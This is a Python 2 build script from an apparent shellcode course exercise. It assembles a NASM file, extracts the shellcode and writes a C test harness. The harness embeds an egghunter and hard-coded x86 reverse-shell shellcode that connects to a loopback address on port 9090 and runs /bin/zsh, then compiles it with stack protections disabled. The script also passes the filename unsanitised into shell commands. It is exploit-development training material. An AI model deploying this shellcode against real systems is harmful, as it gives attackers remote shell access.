#!/usr/bin/python
#
# Linux x86
# Author:  thryb
# Date:    19-07-16
# Purpose: Dirty asm to C & compile (mod for egghunter)
# ID:      SLAE-770
# Git:     https://www.github.com/thryb/SLAE-770
#

import sys, os

if len(sys.argv) == 2:
	file_name = str(sys.argv[1])
else:
	print "Usage: %s <filename.asm>" % str(sys.argv[0])
	exit(2)
 
if file_name[-4:] == ".asm":
	file_name = file_name[:-4]

	print " *** Assembling %s." % file_name
	os.system("nasm -g -f elf32 -o " + file_name + ".o " + file_name + ".asm")

	print " *** Linking %s. " % file_name
	os.system("ld -o " + file_name + ".bin " + file_name + ".o")

	print " *** Extracting shellcode."
	shellcode = os.popen("objdump -d ./" + file_name + ".bin | grep '[0-9a-f]:'" \
	"|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'" \
	"|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/\"/'|sed 's/$/\"/g'").read()

	print " *** Building C file."
	cfile = open('shell.c', "w")
	cfile.write("/* This file has been autogenerated. */\n\n")
	cfile.write("#include <stdio.h>\n#include <string.h>\n#define EGG \"\\x91\\x91\\x91\\x91\"\n")
	cfile.write("unsigned char egghunter[] = \\\n")
	cfile.write(shellcode + ";\n")
	cfile.write("unsigned char code[] =  \\\n")
	cfile.write("EGG\n")
	cfile.write("EGG\n")
	cfile.write("\"\\x31\\xf6\"\n") # added due to ESI being polluted after egghunter execution
	cfile.write("\"\\x31\\xd2\"\n") # added due to EDX being polluted after egghunter execution
	cfile.write("\"\\x31\\xc0\\x31\\xdb\\x50\\x6a\\x01\\x6a\\x02\\xb0\\x66\\xb3\\x01\\x89\\xe1\\xcd\\x80\\x96\\xb0\\x66\"\n")
	cfile.write("\"\\x83\\xc3\\x02\\x68\\x7f\\xff\\xff\\xef\\x66\\x68\\x23\\x82\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\"\n")
	cfile.write("\"\\x56\\x89\\xe1\\xcd\\x80\\x96\\x31\\xc9\\x80\\xc1\\x02\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x50\"\n")
	cfile.write("\"\\x68\\x2f\\x7a\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\n")
	cfile.write("int main(){\n")
	cfile.write("printf(\"Egghunter Length:  %d\\n\", strlen(egghunter));\n")
	cfile.write("printf(\"Shellcode Length:  %d\\n\", strlen(code));\n")
	cfile.write("int (*ret)() = (int(*)())egghunter;ret();}\n")
        cfile.write("/* This file has been autogenerated. */\n\n")
	cfile.close()

	print " *** Compiling shellcode."
	os.system("gcc -g -z execstack -fno-stack-protector shell.c -o " + file_name)

	print " *** Done ^_^"
else:
	print "Usage: %s <filename.asm>" % str(sys.argv[0])
